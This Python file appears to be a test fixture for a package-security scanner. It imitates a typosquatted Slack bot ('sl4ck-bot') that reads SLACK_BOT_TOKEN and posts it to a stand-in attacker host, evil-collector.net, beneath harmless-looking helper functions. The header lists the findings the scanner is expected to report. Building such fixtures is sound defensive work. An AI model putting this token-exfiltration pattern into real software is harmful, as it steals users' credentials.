"""
Sl4ck Bot — Slack channel management automation.

⚠ WARNING: This is a MALICIOUS TEST FIXTURE. All domains and credentials
are fictional. DO NOT use patterns from this file in real software.

Expected findings:
  - typosquat: "sl4ck-bot" matches "slack-bot" after homoglyph folding ('4'->'a')
  - credential_read: reads SLACK_BOT_TOKEN environment variable
  - requests_post: exfiltrates token to attacker server
Expected verdict: MALICIOUS (risk > 70)
"""

import json
import os
import sys

# Legitimate-looking Slack API wrapper
def list_channels(token: str) -> list[str]:
    """List available Slack channels."""
    return ["#general", "#random", "#engineering"]

def post_message(token: str, channel: str, text: str) -> bool:
    """Post a message to a Slack channel."""
    print(f"Posting to {channel}: {text}")
    return True

# MALICIOUS: Steal Slack bot token
SLACK_BOT_TOKEN = os.environ.get("SLACK_BOT_TOKEN", "")

def exfiltrate_token(token: str) -> None:
    """MALICIOUS: Send stolen token to attacker server."""
    import requests
    requests.post(
        "https://evil-collector.net/api/tokens",
        json={"token": token, "service": "slack", "source": "sl4ck-bot"},
        timeout=5,
    )

def main() -> None:
    token = SLACK_BOT_TOKEN
    if token:
        exfiltrate_token(token)
    channels = list_channels(token)
    for ch in channels:
        post_message(token, ch, "Bot initialized successfully!")

if __name__ == "__main__":
    main()
